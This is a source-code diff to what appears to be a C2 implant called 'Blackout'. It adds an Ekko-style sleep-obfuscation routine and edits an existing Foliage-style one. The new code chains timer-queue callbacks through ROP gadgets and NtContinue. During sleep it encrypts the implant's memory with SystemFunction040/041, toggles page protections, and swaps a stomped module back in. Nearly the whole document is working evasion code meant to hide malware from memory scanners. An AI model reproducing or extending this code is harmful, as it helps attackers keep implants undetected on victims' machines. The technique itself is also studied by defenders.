@@ -54,19 +54,20 @@ FUNC VOID XorStack(
 FUNC VOID SleepMain(
     DWORD SleepTime
 ) {
-    FoliageObf( SleepTime );
+    EkkoObf( SleepTime );
 }
 
 FUNC PVOID FindNtTestAlertGadget(
     _In_ LPVOID ModuleBase
 ) {
     BLACKOUT_INSTANCE
-    BYTE Pattern[] = { 0xE8, 0xF8, 0xF6, 0x02, 0x00 };
+
+    BYTE Pattern[] = { 0x48, 0x83, 0xEC, 0x28, 0xF7, 0x41, 0x04, 0x66, 0x00, 0x00, 0x00, 0x74, 0x05 };
 
     DWORD ModuleSize = ( (PIMAGE_NT_HEADERS)( ( B_PTR( ModuleBase ) + ( ( PIMAGE_DOS_HEADER )( ModuleBase ) )->e_lfanew ) ) )->OptionalHeader.SizeOfImage;
 
     for (SIZE_T i = 0; i < ModuleSize; i++) {
-        if (Instance()->Win32.RtlCompareMemory( U_PTR64( ModuleBase ) + i, Pattern, sizeof( Pattern ) ) == sizeof( Pattern ) ) {
+        if ( Instance()->Win32.RtlCompareMemory( U_PTR64( ModuleBase ) + i, Pattern, sizeof( Pattern ) ) == sizeof( Pattern ) ) {
             return U_PTR64( ModuleBase + i );
         }
     }
@@ -74,11 +75,169 @@ FUNC PVOID FindNtTestAlertGadget(
     return NULL;
 }
 
+FUNC VOID EkkoObf(
+    DWORD SleepTime
+) {
+    BLACKOUT_INSTANCE
+
+    ULONG  Status  = 0;
+    HANDLE Queue   = NULL;
+    HANDLE EvtTmr  = NULL;
+    HANDLE EvtStrt = NULL;
+    HANDLE EvtEnd  = NULL;
+    HANDLE Timer   = NULL;
+
+    PVOID OldProt = NULL;
+
+    CONTEXT CtxMain = { 0 };
+    CONTEXT CtxSpf  = { 0 };
+    CONTEXT Ctx[10] = { 0 };
+    
+    UINT16 ic = 0;
+
+    if ( Blackout().Stomp.Backup ) {
+        GetStompedModule();
+        BK_PRINT( 
+            "\n[OBF] Sleepobf with advanced module stomping\n"
+            "[OBF] Mapped backup address  @ 0x%p\n[OBF] Module name %ws @ 0x%p\n"
+            , Blackout().Stomp.Backup, Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModBase 
+        );
+    }
+
+    BK_PRINT( "\n" );
+    BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
+    BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
+    BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );
+
+    BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().Gadgets.JmpGadget );
+    BK_PRINT( "[OBF] ret gadget to NtTestAlert @ 0x%p\n", Blackout().Gadgets.RetGadget );
+    BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().Gadgets.NtContinueGadget );
+
+    Status = Instance()->Win32.NtCreateEvent( &EvtTmr,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
+    Status = Instance()->Win32.NtCreateEvent( &EvtStrt, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
+    Status = Instance()->Win32.NtCreateEvent( &EvtEnd,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
+
+    Status = Instance()->Win32.RtlCreateTimerQueue( &Queue );
+    if ( Status != 0 ) { __debugbreak; return; }
+
+    Status = Instance()->Win32.RtlCreateTimer( Queue, &Timer, Instance()->Win32.RtlCaptureContext, &CtxMain, 100, 0, WT_EXECUTEINTIMERTHREAD );
+
+    for ( INT i = 0; i < 10; i++ ) {
+        MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
+        Ctx[i].Rsp -= sizeof( PVOID );
+    }
+
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtWaitForSingleObject;
+    Ctx[ic].Rcx = EvtStrt;
+    Ctx[ic].Rdx = FALSE;
+    Ctx[ic].R8  = 0x32;
+    ic++;
+
+    if ( Blackout().Stomp.Backup ) {
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rcx = Blackout().Stomp.Backup;
+        Ctx[ic].Rdx = Blackout().Region.Base;
+        Ctx[ic].R8  = Blackout().Region.Length;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
+        Ctx[ic].Rcx = Blackout().Stomp.ModBase;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget; 
+        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExW;
+        Ctx[ic].Rcx = Blackout().Stomp.ModName.Buffer;
+        Ctx[ic].Rdx = NULL;
+        Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
+        ic++;
+    } else {
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().RxRegion.Base;
+        Ctx[ic].Rdx = Blackout().RxRegion.Length;
+        Ctx[ic].R8  = PAGE_READWRITE;
+        Ctx[ic].R9  = &OldProt;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        ic++;
+    }
+
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.WaitForSingleObjectEx;
+    Ctx[ic].Rcx = NtCurrentProcess();
+    Ctx[ic].Rdx = SleepTime;
+    Ctx[ic].R8  = FALSE;
+    ic++;
+
+    if ( Blackout().Stomp.Backup ) {
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        Ctx[ic].R8  = PAGE_READWRITE;
+        Ctx[ic].R9  = &OldProt;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Stomp.Backup;
+        Ctx[ic].R8  = Blackout().Region.Length;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().RxRegion.Base;
+        Ctx[ic].Rdx = Blackout().RxRegion.Length;
+        Ctx[ic].R8  = PAGE_EXECUTE_READ;
+        Ctx[ic].R9  = &OldProt;
+        ic++; 
+    } else {
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
+        Ctx[ic].Rcx = Blackout().Region.Base;
+        Ctx[ic].Rdx = Blackout().Region.Length;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
+        Ctx[ic].Rcx = Blackout().RxRegion.Base;
+        Ctx[ic].Rdx = Blackout().RxRegion.Length;
+        Ctx[ic].R8  = PAGE_EXECUTE_READ;
+        Ctx[ic].R9  = &OldProt;
+        ic++;
+    }
+
+    Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.SetEvent;
+    Ctx[ic].Rcx = EvtEnd;
+    ic++;
+
+    ULONG Dly = 0;
+    for ( INT i = 0; i < 10; i++ ) {
+        Instance()->Win32.RtlCreateTimer( Queue, &Timer, Blackout().Gadgets.NtContinueGadget, &Ctx[i], Dly += 200, 0, WT_EXECUTEINTIMERTHREAD );
+    }
+
+    BK_PRINT( "[OBF] Trigger obf chain\n" );
+
+    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtStrt, EvtEnd, FALSE, NULL );
+
+
+}
+
 FUNC VOID FoliageObf( 
     DWORD SleepTime
 ) {
     BLACKOUT_INSTANCE
-    
+
     LONG   Status     = 0x00;
 
     HANDLE EvtSync       = NULL;
@@ -130,6 +289,8 @@ FUNC VOID FoliageObf(
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
+    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;
+
     for ( INT i = 0; i < 10; i++ ) {
         MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
     }
@@ -139,7 +300,7 @@ FUNC VOID FoliageObf(
     Ctx[ic].Rcx = EvtSync;
     Ctx[ic].Rdx = FALSE;
     Ctx[ic].R9  = NULL;
-    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
     if ( Blackout().Stomp.Backup ) {
@@ -149,13 +310,13 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rcx = Blackout().Stomp.Backup;
         Ctx[ic].Rdx = Blackout().Region.Base;
         Ctx[ic].R8  = Blackout().Region.Length;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
         Ctx[ic].Rcx = Blackout().Stomp.ModBase;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget; 
@@ -163,7 +324,7 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rcx = Blackout().Stomp.ModName.Buffer;
         Ctx[ic].Rdx = NULL;
         Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
     } else {
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
@@ -172,14 +333,14 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rdx = Blackout().RxRegion.Length;
         Ctx[ic].R8  = PAGE_READWRITE;
         Ctx[ic].R9  = &OldProt;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Region.Length;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
     }
 
@@ -188,7 +349,7 @@ FUNC VOID FoliageObf(
     Ctx[ic].Rcx = NtCurrentProcess();
     Ctx[ic].Rdx = SleepTime;
     Ctx[ic].R8  = FALSE;
-    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
     if ( Blackout().Stomp.Backup ) {
@@ -198,7 +359,7 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rdx = Blackout().Region.Length;
         Ctx[ic].R8  = PAGE_READWRITE;
         Ctx[ic].R9  = &OldProt;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
@@ -206,7 +367,7 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Stomp.Backup;
         Ctx[ic].R8  = Blackout().Region.Length;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
@@ -215,14 +376,14 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rdx = Blackout().RxRegion.Length;
         Ctx[ic].R8  = PAGE_EXECUTE_READ;
         Ctx[ic].R9  = &OldProt;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++; 
     } else {
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Region.Length;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
@@ -231,14 +392,14 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rdx = Blackout().RxRegion.Length;
         Ctx[ic].R8  = PAGE_EXECUTE_READ;
         Ctx[ic].R9  = &OldProt;
-        *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
     }
 
     Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
     Ctx[ic].Rbx = &Instance()->Win32.RtlExitUserThread;
     Ctx[ic].Rcx = 0x00;
-    *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
     for ( INT i = 0; i < ic; i++ ) {
